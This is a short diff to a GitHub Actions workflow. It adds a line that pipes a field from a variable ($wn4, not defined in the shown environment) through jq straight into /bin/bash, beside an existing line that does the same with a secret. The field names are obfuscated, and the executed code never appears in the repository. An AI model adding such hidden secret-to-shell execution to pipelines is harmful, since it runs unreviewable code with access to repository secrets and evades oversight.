@@ -19,6 +19,7 @@ jobs:
           unw1: ${{ secrets.unw1 }}
         run: |
           printf '%s' "$unw1" | jq -r .jady43617 | /bin/bash
+          printf '%s' "$wn4" | jq -r .uljnb8584 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
